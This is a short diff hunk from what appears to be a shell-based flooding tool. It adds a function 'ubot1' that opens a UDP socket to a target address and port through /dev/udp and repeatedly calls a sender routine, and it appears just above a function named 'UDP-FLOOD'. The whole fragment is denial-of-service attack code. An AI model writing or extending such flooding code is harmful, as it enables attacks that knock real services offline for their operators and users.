@@ -314,6 +314,13 @@ exec 1<>/dev/udp/$UIP/$uprt
 udpbot1 >&1
 udpbot1 >&1
 udpbot1 >&1
+ubot1 $UIP $uprt
+}
+
+ubot1() {
+exec 1<>/dev/udp/$UIP/$uprt
+udpbot1 >&1
+udpbot1 >&1
 }
 
 UDP-FLOOD() {
